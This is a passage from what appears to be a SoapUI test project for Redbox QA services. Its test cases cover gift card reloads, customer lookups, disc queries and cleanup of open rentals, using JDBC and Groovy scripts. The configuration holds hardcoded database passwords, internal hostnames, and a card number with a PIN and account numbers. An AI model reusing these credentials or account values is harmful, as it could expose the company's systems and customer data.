</soapenv:Envelope>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="124f6f61-17b2-4a73-a73d-3c16e7466257" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:assertion type="XPath Match" id="94997863-571e-45c9-832d-b20288acf080" name="Match content of [Success]"><con:configuration><path>declare namespace ns1='http://rentalservices.redbox.com/MerchantService';
//ns1:ReloadResponse[1]/ns1:ReloadResult[1]/ns1:Success[1]/text()</path><content>true</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Exit" id="fbf8dd7e-51f5-431e-81e8-354f61a1a95a"><con:settings/><con:config><script>log.info ("Completed Reload testCase");</script></con:config></con:testStep><con:properties><con:property><con:name>CardAccountID</con:name><con:value>8319813</con:value></con:property><con:property><con:name>Amount</con:name><con:value/></con:property><con:property><con:name>CardNumber</con:name><con:value>7777065480107268</con:value></con:property><con:property><con:name>CardExists</con:name><con:value>1</con:value></con:property><con:property><con:name>GCPin</con:name><con:value>58538779</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>173d189c-85cd-4190-8cca-642e5b721887</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>077f8dc6-fb6b-44a3-a421-cada5e0527a5</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Get Customer Info From Encrypted CC" searchProperties="true" id="8cf236cc-e461-4c38-a639-41e50bfcdfe3"><con:settings/><con:testStep type="jdbc" name="Lookup CreditCardAccount by Encrypted Card Number" id="0c8ca94e-15d3-49bc-9b2c-009c46393130"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	OID 
FROM 
	CreditCardAccount (NOLOCK)
WHERE 
	HashId = :cardID
</con:query><con:assertion type="JDBC Status" id="90c85d0f-62c0-43bc-a52d-3f13bc579229" name="JDBC Status"/><con:properties><con:property><con:name>cardID</con:name><con:value>${#TestCase#CardHashId}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="transfer" name="Save OID (Account Num)" id="4cc32141-8fea-4ca5-a033-1ad14790bf67"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" useXQuery="false" entitize="false" transferChildNodes="false"><con:name>OID</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Lookup CreditCardAccount by Encrypted Card Number</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/OID[1]</con:sourcePath><con:targetType>CardAccountId</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:testStep type="jdbc" name="Lookup Customer by Account Number" id="822f0b3b-71bb-475c-8e2f-1eea49baff8d"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	Customer_ID, 
	CpCustomerNumber,
	cpAccountNumber
FROM 
	Customer (NOLOCK)
WHERE 
	CardAccountID = :AccountNum
</con:query><con:assertion type="JDBC Status" id="319d1860-8bad-4e30-a6d3-05c40b28425f" name="JDBC Status"/><con:properties><con:property><con:name>AccountNum</con:name><con:value>${#TestCase#CardAccountId}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="transfer" name="Save CustomerInfo" id="b0c64c04-0029-4fe9-a1de-8e63a47c55e6"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" useXQuery="false" entitize="false" transferChildNodes="false"><con:name>OID</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Lookup Customer by Account Number</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/CPCUSTOMERNUMBER[1]</con:sourcePath><con:targetType>CpCustomerNumber</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>AccountNumber</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Lookup Customer by Account Number</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/CPACCOUNTNUMBER[1]</con:sourcePath><con:targetType>CpAccountNumber</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>CustomerID</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Lookup Customer by Account Number</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/CUSTOMER_ID[1]</con:sourcePath><con:targetType>CustomerId</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Get CC Info");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Get CC Info");</con:setupScript><con:properties><con:property><con:name>CardHashId</con:name><con:value>+J0VLD+oBAw2PaOsD4vmZqEcfpINWgAHbT7dBtTUS7s=</con:value></con:property><con:property><con:name>CardAccountId</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">8592160</con:value></con:property><con:property><con:name>CustomerId</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">309946</con:value></con:property><con:property><con:name>CpCustomerNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90855364928109</con:value></con:property><con:property><con:name>CpAccountNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">12483639551849</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:testCase id="b2c56c14-732f-4f12-9706-59ea3c8a7322" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="GetDiscs" searchProperties="true" maxResults="0"><con:settings/><con:savedRecentRuns>1</con:savedRecentRuns><con:testStep type="jdbc" name="Get DiscIds" id="1b60960f-71d0-4414-9533-729ac9453b6a"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>;WITH cte_Discs
AS
(SELECT
              d.Title_ID,
       d.RF_ID,
       d.Disc_ID,
ROW_NUMBER() over(PARTITION BY d.Title_ID ORDER BY RF_ID DESC) RowNum
from Disc d 
inner join Title t on d.Title_ID=t.title_ID 
inner join [QaAutomation].[dbo].[TempTitle] temp on d.Title_ID=temp.TitleID
where 
t.FormatId in (${#TestCase#FormatID}) 
and 
d.Title_ID not in (${#TestCase#ExcludeRentalTitles},${#TestCase#ExcludePurchaseTitles}) 
and 
d.KioskClient_ID = ${#TestCase#KioskID}
and
temp.IsValid = 1
and
temp.IsMDV = ${#TestCase#IsMDV}
--and
--d.Physical_Status = 2
)
select title_ID,RF_ID,Disc_ID from cte_Discs
WHERE RowNum = 1
Order by RF_ID</con:query><con:assertion type="JDBC Status" id="3f21bb9f-f8d9-4c15-887e-cf6d3dc36f71" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Save TitleIDs" id="cb6e16ff-fff4-4f12-8653-62e126edddda"><con:settings/><con:config><script>//Note: Disabled the extra logging.
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);

//Get available titles from Kiosk.
def getDiscsHolder = groovyUtils.getXmlHolder("Get DiscIds#ResponseAsXml");
def numOfTitles = getDiscsHolder["count(//ResultSet[1]/Row)"].toInteger();
def formatName = context.expand( '${#TestCase#FormatName}' )

//log.info ("num Of Available Titles: $numOfTitles");
//Prepare the list for available Titles in the Store.
def titleList = [];
def barcodeList = [];
//def notInStock = [];
for (i in 1..numOfTitles)
{
	//inStock = getDiscsHolder.getNodeValue("//ns1:products[1]/ns1:e[$i]/ns1:stock[1]")
	titleID = getDiscsHolder.getNodeValue("//ResultSet[1]/Row[$i]/TITLE_ID[1]").toInteger();
	titleList.add(titleID.toInteger());
	barcode = getDiscsHolder.getNodeValue("//ResultSet[1]/Row[$i]/RF_ID[1]");
	barcodeList.add(barcode);
}
testRunner.testCase.setPropertyValue("$formatName-Titles", titleList.join(",").toString());
testRunner.testCase.setPropertyValue("$formatName-Barcodes", barcodeList.join(",").toString());</script></con:config></con:testStep><con:properties><con:property><con:name>ExcludeRentalTitles</con:name><con:value>10580,10581</con:value></con:property><con:property><con:name>ExcludePurchaseTitles</con:name><con:value>0</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>TitleIds</con:name><con:value/></con:property><con:property><con:name>Barcodes</con:name><con:value/></con:property><con:property><con:name>FormatIds</con:name><con:value/></con:property><con:property><con:name>NumOfRecoRentals</con:name><con:value/></con:property><con:property><con:name>FormatID</con:name><con:value>11</con:value></con:property><con:property><con:name>FormatName</con:name><con:value>PS4</con:value></con:property><con:property><con:name>DVD-Titles</con:name><con:value/></con:property><con:property><con:name>DVD-Barcodes</con:name><con:value/></con:property><con:property><con:name>Blu-ray-Titles</con:name><con:value/></con:property><con:property><con:name>Blu-ray-Barcodes</con:name><con:value/></con:property><con:property><con:name>PS4-Titles</con:name><con:value>10580,10581,10582</con:value></con:property><con:property><con:name>PS4-Barcodes</con:name><con:value>001505074,001505075,001505076</con:value></con:property><con:property><con:name>Xbox One-Titles</con:name><con:value/></con:property><con:property><con:name>Xbox One-Barcodes</con:name><con:value/></con:property><con:property><con:name>DigitalCode-Titles</con:name><con:value/></con:property><con:property><con:name>DigitalCode-Barcodes</con:name><con:value/></con:property><con:property><con:name>Nintendo Switch-Titles</con:name><con:value/></con:property><con:property><con:name>Nintendo Switch-Barcodes</con:name><con:value/></con:property><con:property><con:name>Wii U-Titles</con:name><con:value/></con:property><con:property><con:name>Wii U-Barcodes</con:name><con:value/></con:property><con:property><con:name>4K UHD-Titles</con:name><con:value/></con:property><con:property><con:name>4K UHD-Barcodes</con:name><con:value/></con:property><con:property><con:name>Xbox 360-Titles</con:name><con:value/></con:property><con:property><con:name>Xbox 360-Barcodes</con:name><con:value/></con:property><con:property><con:name>IsMDV</con:name><con:value>1</con:value></con:property><con:property><con:name>PS3-Titles</con:name><con:value/></con:property><con:property><con:name>PS3-Barcodes</con:name><con:value/></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>139bf481-9387-4fc2-9dd9-3f009a1e1a2f</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="d45f0ac3-5f2a-42d0-9525-c6ac0c9fa2c0" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="Cleanup Open Transactions" searchProperties="true" timeout="0"><con:settings/><con:testStep type="jdbc" name="Open Rentals" id="f0788d35-74b3-4cec-bdb5-2dc5cac83d11"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>exec rb_GetCustomerActiveRentals :CustomerId</con:query><con:properties><con:property><con:name>CustomerId</con:name><con:value>${#TestCase#CustomerId}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Update Rentals" id="5caeeedb-ceb6-4db9-a6ef-ceff6289db20"><con:settings/><con:config><script>//Note: Disabled the extra logging.
import com.eviware.soapui.model.testsuite.TestRunner.Status
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get Data
def customerId = context.expand( '${#TestCase#CustomerId}' );
def kioskID = context.expand( '${#TestCase#kioskID}' );


//Get available titles from Kiosk.
def getHolder = groovyUtils.getXmlHolder("Open Rentals#ResponseAsXml");
def numOfTitles = getHolder["count(//ResultSet[1]/Row)"].toInteger();

if (numOfTitles > 0)
{
	log.info ("Number Of Open Rental Titles : $numOfTitles")
	for (i in 1..numOfTitles)
	{
		titleID = getHolder.getNodeValue("//ResultSet[1]/Row[$i]/TITLEID[1]")	
		sqlQuery = ""
		sqlQuery += "Update Disc_Transaction"
		sqlQuery += "\n"
		sqlQuery += "set Return_Date=GetDate(), Return_Client=$kioskID, DiscTransaction_Status=3"
		sqlQuery += "\n"
		sqlQuery += "Where Transaction_ID in (Select Transaction_ID From [Transaction] Where Customer_ID = $customerId) "
		sqlQuery += "\n"
		sqlQuery += "and title_id in ($titleID)"
		sqlQuery += "\n"
		sqlQuery += "and Return_Date is NULL"
		sqlQuery += "\n"
	
		//Execute query
		sql.executeUpdate(sqlQuery)
	}
}
else
{
	log.info ("No open Rentals");
}

//Delete Customer Transaction Records.
log.info("Number of Customer Transactions records deleted: " + sql.executeUpdate("DELETE FROM CustomerTransaction WHERE CustomerId in ($customerId)"));
</script></con:config></con:testStep><con:testStep type="jdbc" name="Open Reservations" id="05017c17-7b75-4061-815d-64c3833ce3ed"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>exec rb_GetCustomerActiveReservations :CustomerId</con:query><con:properties><con:property><con:name>CustomerId</con:name><con:value>${#TestCase#CustomerId}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Update Reservations" id="d04d9304-4d24-42fa-ab21-04877c8d5ee4"><con:settings/><con:config><script>//Note: Disabled the extra logging.
import com.eviware.soapui.model.testsuite.TestRunner.Status
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get Data
def customerId = context.expand( '${#TestCase#CustomerId}' )
def kioskID = context.expand( '${#TestCase#kioskID}' );


//Get available titles from Kiosk.
def getHolder = groovyUtils.getXmlHolder("Open Reservations#ResponseAsXml");
def numOfTitles = getHolder["count(//Results[1]/ResultSet[1]/Row)"].toInteger();

if (numOfTitles > 0)
{
	log.info ("Number Of Open Reservation Titles : $numOfTitles")
	sql.executeUpdate("Update Reservation Set StatusCode = 4, FailureCode = 7 Where CustomerID = $customerId and StatusCode = 1");
	sql.executeUpdate("Update [Transaction] set Transaction_Status = 25 where Transaction_ID in (Select ProcessorLogID from Reservation Where CustomerID = $customerId and StatusCode = 1)")
}
else
{
	log.info ("No open reservations");
}
</script></con:config></con:testStep><con:properties><con:property><con:name>CustomerId</con:name><con:value>309946</con:value></con:property><con:property><con:name>kioskID</con:name><con:value>1505</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:properties><con:property><con:name>collectionmethod</con:name><con:value>6</con:value></con:property><con:property><con:name>DVDPrice</con:name><con:value>1.50</con:value></con:property><con:property><con:name>BlurayPrice</con:name><con:value>2</con:value></con:property><con:property><con:name>GamePrice</con:name><con:value>3</con:value></con:property></con:properties><con:reportParameters/></con:testSuite><con:requirements/><con:properties><con:property><con:name>SQLDriver</con:name><con:value>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:value></con:property><con:property><con:name>KSEndpoint</con:name><con:value>http://qarbapp01.rb.local/KioskServices2.0.0/messageservice.aspx</con:value></con:property><con:property><con:name>KioskBundleVersion</con:name><con:value>2.2.2.82</con:value></con:property><con:property><con:name>BundleVersion</con:name><con:value>2.2.2.82</con:value></con:property><con:property><con:name>MerchantServiceConnection</con:name><con:value>rcp-rem://qamerch04:7001</con:value></con:property><con:property><con:name>MerchantServiceConsolePath</con:name><con:value>c:\\Temp\\Test\\mstool.exe</con:value></con:property><con:property><con:name>KeyId</con:name><con:value>100002</con:value></con:property><con:property><con:name>CSendpoint</con:name><con:value>http://qamerch04.rb.local</con:value></con:property><con:property><con:name>MSAppServer</con:name><con:value>QAMERCH04.rb.local</con:value></con:property><con:property><con:name>CreditSvcEndpoint</con:name><con:value>http://qa-corpsys04/CreditServiceR3.1/CreditSubscription.svc</con:value></con:property></con:properties><con:wssContainer/><con:databaseConnectionContainer><con:databaseConnection><con:name>RedboxServerDB</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>CreditSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CreditSvc;integratedSecurity=true;</con:connectionString><con:password>Sec</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>MerchantService</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true;</con:connectionString><con:password>tes</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>BillingService</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=BillingService;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>Promotion</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=Promotion;integratedSecurity=true;</con:connectionString><con:password>d</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>CustomerProfileSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CustomerProfileSvc;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>ETLMgt</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB111.rb.local:1433;databaseName=ETLMgt;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>QaAutomation</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>EPCSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=EPCSvc;integratedSecurity=true;</con:connectionString><con:password>Redbox1!</con:password><con:connectionProperties/></con:databaseConnection></con:databaseConnectionContainer><con:jmsConnectionContainer/><con:oAuth2ProfileContainer><con:oAuth2Profile><con:name>client_credentials</con:name><con:type>OAuth 2.0</con:type><con:accessTokenPosition>HEADER</con:accessTokenPosition><con:oAuth2Flow>AUTHORIZATION_CODE_GRANT</con:oAuth2Flow><con:refreshAccessTokenMethod>AUTOMATIC</con:refreshAccessTokenMethod><con:responseType>id_token</con:responseType></con:oAuth2Profile></con:oAuth2ProfileContainer><con:oAuth1ProfileContainer/><con:reporting><con:xmlTemplates/><con:parameters/></con:reporting><con:eventHandlers type="TestRunListener.afterStep" name="TestRunListener.afterStep"><con:script>import com.eviware.soapui.model.testsuite.TestStepResult;

if (testStepResult.status == TestStepResult.TestStepStatus.FAILED)
{
 testRunner.gotoStepByName("DataSource Loop") //Or whatever else your DataSource loops are called
}</con:script></con:eventHandlers><con:environment id="4af3fc93-9685-42bf-a07f-496268228e70" name="QAInt"><con:property><con:name>SQLDriver</con:name><con:value/></con:property><con:property><con:name>KSEndpoint</con:name><con:value>http://qarbapp01.rb.local/KioskServices2.0.0/messageservice.aspx</con:value></con:property><con:property><con:name>KioskBundleVersion</con:name><con:value/></con:property><con:property><con:name>BundleVersion</con:name><con:value/></con:property><con:property><con:name>MerchantServiceConnection</con:name><con:value>rcp-rem://qamerch04:7001</con:value></con:property><con:property><con:name>MerchantServiceConsolePath</con:name><con:value>c:\\Temp\\Test\\mstool.exe</con:value></con:property><con:property><con:name>KeyId</con:name><con:value>100002</con:value></con:property><con:property><con:name>CSendpoint</con:name><con:value>http://qamerch04.rb.local</con:value></con:property><con:property><con:name>MSAppServer</con:name><con:value>QAMERCH04.rb.local</con:value></con:property><con:property><con:name>CreditSvcEndpoint</con:name><con:value>http://qa-corpsys04/CreditServiceR3.1/CreditSubscription.svc</con:value></con:property><con:databaseConnectionContainer><con:databaseConnection><con:name>RedboxServerDB</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>CreditSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CreditSvc;integratedSecurity=true;</con:connectionString><con:password>Sec</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>MerchantService</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>BillingService</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=BillingService;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>Promotion</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=Promotion;integratedSecurity=true;</con:connectionString><con:password>d</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>CustomerProfileSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CustomerProfileSvc;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>ETLMgt</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB111.rb.local:1433;databaseName=ETLMgt;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>QaAutomation</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>EPCSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=EPCSvc;integratedSecurity=true</con:connectionString><con:password/><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>EPCSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=EPCSvc;integratedSecurity=true</con:connectionString><con:password/><con:connectionProperties/></con:databaseConnection></con:databaseConnectionContainer><con:jmsConnectionContainer/></con:environment><con:environment id="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a" name="P1"><con:property><con:name>SQLDriver</con:name><con:value>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:value></con:property><con:property><con:name>KSEndpoint</con:name><con:value>http://p1app01.rb.local/KioskServices/messageservice.aspx</con:value></con:property><con:property><con:name>KioskBundleVersion</con:name><con:value>2.2.2.82</con:value></con:property><con:property><con:name>BundleVersion</con:name><con:value>2.2.2.82</con:value></con:property><con:property><con:name>MerchantServiceConnection</con:name><con:value>rcp-rem://qamerch04:7001</con:value></con:property><con:property><con:name>MerchantServiceConsolePath</con:name><con:value>c:\\Temp\\Test\\mstool.exe</con:value></con:property><con:property><con:name>KeyId</con:name><con:value>100002</con:value></con:property><con:property><con:name>CSendpoint</con:name><con:value>http://qamerch04.rb.local</con:value></con:property><con:property><con:name>MSAppServer</con:name><con:value>QAMERCH04.rb.local</con:value></con:property><con:property><con:name>CreditSvcEndpoint</con:name><con:value>http://qa-corpsys04/CreditServiceR3.1/CreditSubscription.svc</con:value></con:property><con:databaseConnectionContainer><con:databaseConnection><con:name>RedboxServerDB</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>CreditSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CreditSvc;integratedSecurity=true;</con:connectionString><con:password>Sec</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>MerchantService</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true;</con:connectionString><con:password>tes</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>BillingService</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=BillingService;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>Promotion</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=Promotion;integratedSecurity=true;</con:connectionString><con:password>d</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>CustomerProfileSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CustomerProfileSvc;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionPro